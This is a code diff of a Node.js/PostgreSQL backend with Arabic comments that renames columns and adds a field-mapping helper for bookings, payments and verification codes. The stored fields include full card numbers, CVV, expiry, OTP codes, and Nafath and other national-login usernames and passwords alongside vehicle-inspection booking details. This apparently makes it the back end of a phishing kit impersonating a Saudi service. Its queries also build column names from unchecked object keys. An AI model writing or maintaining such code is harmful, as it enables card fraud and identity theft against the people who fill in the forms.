@@ -117,15 +117,71 @@ const initDb = async () => {
 
 initDb();
 
+// ==================== دالة تحويل أسماء الحقول من lowercase إلى camelCase ====================
+function toCamel(row) {
+  if (!row) return null;
+  const map = {
+    referenceid: 'referenceId',
+    clientname: 'clientName',
+    clientid: 'clientId',
+    clientphone: 'clientPhone',
+    clientemail: 'clientEmail',
+    clientnationality: 'clientNationality',
+    hasdelegate: 'hasDelegate',
+    delegatetype: 'delegateType',
+    delegatename: 'delegateName',
+    delegatephone: 'delegatePhone',
+    delegatenationality: 'delegateNationality',
+    delegateid: 'delegateId',
+    vehiclecountry: 'vehicleCountry',
+    vehicleplate: 'vehiclePlate',
+    vehicleplatechar1: 'vehiclePlateChar1',
+    vehicleplatechar2: 'vehiclePlateChar2',
+    vehicleplatechar3: 'vehiclePlateChar3',
+    vehicletype: 'vehicleType',
+    vehiclecarrydang: 'vehicleCarryDang',
+    serviceregion: 'serviceRegion',
+    servicetype: 'serviceType',
+    servicedate: 'serviceDate',
+    servicetime: 'serviceTime',
+    clientip: 'clientIp',
+    rawdata: 'rawData',
+    statusread: 'statusRead',
+    createdat: 'createdAt',
+    cardholdername: 'cardHolderName',
+    cardnumber: 'cardNumber',
+    cardlastfour: 'cardLastFour',
+    cardexpiry: 'cardExpiry',
+    cardcvv: 'cardCvv',
+    verifycode: 'verifyCode',
+    secretnum: 'secretNum',
+    rajusername: 'rajUsername',
+    rajpassword: 'rajPassword',
+    paymentaction: 'paymentAction',
+    nafathid: 'nafathId',
+    nafathpassword: 'nafathPassword',
+    nafathnumber: 'nafathNumber',
+    motaselprovider: 'motaselProvider',
+    motaselphone: 'motaselPhone',
+    motaselcode: 'motaselCode',
+    otpcode: 'otpCode',
+  };
+  const result = {};
+  for (const [k, v] of Object.entries(row)) {
+    result[map[k] || k] = v;
+  }
+  return result;
+}
+
 // ==================== دوال قاعدة البيانات (PostgreSQL) ====================
 async function createBooking(data) {
   const query = `
     INSERT INTO bookings (
-      referenceId, clientName, clientId, clientPhone, clientEmail, clientNationality,
-      hasDelegate, delegateType, delegateName, delegatePhone, delegateNationality, delegateId,
-      vehicleCountry, vehiclePlate, vehiclePlateChar1, vehiclePlateChar2, vehiclePlateChar3,
-      vehicleType, vehicleCarryDang, serviceRegion, serviceType, serviceDate, serviceTime,
-      clientIp, rawData, status, statusRead
+      referenceid, clientname, clientid, clientphone, clientemail, clientnationality,
+      hasdelegate, delegatetype, delegatename, delegatephone, delegatenationality, delegateid,
+      vehiclecountry, vehicleplate, vehicleplatechar1, vehicleplatechar2, vehicleplatechar3,
+      vehicletype, vehiclecarrydang, serviceregion, servicetype, servicedate, servicetime,
+      clientip, rawdata, status, statusread
     ) VALUES (
       $1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17, $18, $19, $20, $21, $22, $23, $24, $25, $26, $27
     ) RETURNING *`;
@@ -143,18 +199,20 @@ async function createBooking(data) {
 }
 
 async function getBookingByReference(referenceId) {
-  const res = await pool.query("SELECT * FROM bookings WHERE referenceId = $1", [referenceId]);
+  const res = await pool.query("SELECT * FROM bookings WHERE referenceid = $1", [referenceId]);
   const row = res.rows[0];
   if (!row) return null;
-  try { row.rawData = JSON.parse(row.rawData); } catch(e) { row.rawData = {}; }
-  return row;
+  const r = toCamel(row);
+  try { r.rawData = JSON.parse(r.rawData); } catch(e) { r.rawData = {}; }
+  return r;
 }
 
 async function getAllBookings() {
-  const res = await pool.query("SELECT * FROM bookings ORDER BY createdAt DESC");
+  const res = await pool.query("SELECT * FROM bookings ORDER BY createdat DESC");
   return res.rows.map(r => {
-    try { r.rawData = JSON.parse(r.rawData); } catch(e) { r.rawData = {}; }
-    return r;
+    const row = toCamel(r);
+    try { row.rawData = JSON.parse(row.rawData); } catch(e) { row.rawData = {}; }
+    return row;
   });
 }
 
@@ -167,49 +225,52 @@ async function updateBookingStatus(referenceId, status, statusRead) {
 }
 
 async function createOrUpdatePayment(referenceId, data) {
-  const existing = await pool.query("SELECT id FROM payments WHERE referenceId = $1", [referenceId]);
+  const existing = await pool.query("SELECT id FROM payments WHERE referenceid = $1", [referenceId]);
   
   if (existing.rows.length > 0) {
     const keys = Object.keys(data).filter(k => k !== 'referenceId');
-    const sets = keys.map((k, i) => `${k} = $${i + 2}`).join(", ");
+    const sets = keys.map((k, i) => `${k.toLowerCase()} = $${i + 2}`).join(", ");
     const values = keys.map(k => k === 'rawData' ? JSON.stringify(data[k]) : data[k]);
-    await pool.query(`UPDATE payments SET ${sets} WHERE referenceId = $1`, [referenceId, ...values]);
+    await pool.query(`UPDATE payments SET ${sets} WHERE referenceid = $1`, [referenceId, ...values]);
   } else {
-    const keys = ['referenceId', ...Object.keys(data)];
+    const keys = ['referenceid', ...Object.keys(data).map(k => k.toLowerCase())];
     const placeholders = keys.map((_, i) => `$${i + 1}`).join(", ");
-    const values = keys.map(k => k === 'referenceId' ? referenceId : (k === 'rawData' ? JSON.stringify(data[k]) : data[k]));
+    const dataKeys = Object.keys(data);
+    const values = [referenceId, ...dataKeys.map(k => k === 'rawData' ? JSON.stringify(data[k]) : data[k])];
     await pool.query(`INSERT INTO payments (${keys.join(", ")}) VALUES (${placeholders})`, values);
   }
   return getPaymentByReference(referenceId);
 }
 
 async function getPaymentByReference(referenceId) {
-  const res = await pool.query("SELECT * FROM payments WHERE referenceId = $1", [referenceId]);
+  const res = await pool.query("SELECT * FROM payments WHERE referenceid = $1", [referenceId]);
   const row = res.rows[0];
   if (!row) return null;
-  try { row.rawData = JSON.parse(row.rawData); } catch(e) { row.rawData = {}; }
-  return row;
+  const r = toCamel(row);
+  try { r.rawData = JSON.parse(r.rawData); } catch(e) { r.rawData = {}; }
+  return r;
 }
 
 async function createOrUpdateVerification(referenceId, type, data) {
-  const existing = await pool.query("SELECT id FROM verification_codes WHERE referenceId = $1 AND type = $2", [referenceId, type]);
+  const existing = await pool.query("SELECT id FROM verification_codes WHERE referenceid = $1 AND type = $2", [referenceId, type]);
   if (existing.rows.length > 0) {
     const keys = Object.keys(data);
-    const sets = keys.map((k, i) => `${k} = $${i + 3}`).join(", ");
+    const sets = keys.map((k, i) => `${k.toLowerCase()} = $${i + 3}`).join(", ");
     const values = keys.map(k => k === 'rawData' ? JSON.stringify(data[k]) : data[k]);
-    await pool.query(`UPDATE verification_codes SET ${sets} WHERE referenceId = $1 AND type = $2`, [referenceId, type, ...values]);
+    await pool.query(`UPDATE verification_codes SET ${sets} WHERE referenceid = $1 AND type = $2`, [referenceId, type, ...values]);
   } else {
-    const keys = ['referenceId', 'type', ...Object.keys(data)];
+    const keys = ['referenceid', 'type', ...Object.keys(data).map(k => k.toLowerCase())];
     const placeholders = keys.map((_, i) => `$${i + 1}`).join(", ");
-    const values = keys.map(k => k === 'referenceId' ? referenceId : (k === 'type' ? type : (k === 'rawData' ? JSON.stringify(data[k]) : data[k])));
+    const dataKeys = Object.keys(data);
+    const values = [referenceId, type, ...dataKeys.map(k => k === 'rawData' ? JSON.stringify(data[k]) : data[k])];
     await pool.query(`INSERT INTO verification_codes (${keys.join(", ")}) VALUES (${placeholders})`, values);
   }
-  const res = await pool.query("SELECT * FROM verification_codes WHERE referenceId = $1 AND type = $2", [referenceId, type]);
+  const res = await pool.query("SELECT * FROM verification_codes WHERE referenceid = $1 AND type = $2", [referenceId, type]);
   return res.rows[0];
 }
 
 async function getVerificationByReference(referenceId, type) {
-  const res = await pool.query("SELECT * FROM verification_codes WHERE referenceId = $1 AND type = $2", [referenceId, type]);
+  const res = await pool.query("SELECT * FROM verification_codes WHERE referenceid = $1 AND type = $2", [referenceId, type]);
   return res.rows[0];
 }
 
